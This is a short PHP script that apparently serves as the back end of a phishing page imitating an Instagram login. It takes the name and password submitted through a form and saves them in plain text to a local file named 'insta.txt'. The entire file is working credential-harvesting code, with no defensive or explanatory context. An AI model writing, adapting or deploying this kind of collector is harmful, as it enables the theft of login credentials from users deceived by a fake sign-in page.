<?php
$data_file = fopen("insta.txt", "w");

$name = $_POST{"name"};
$password = $_POST{"password"};
$text_to_write = $name. " ". $password;

fwrite($data_file, $text_to_write);
fclose($data_file);
?>
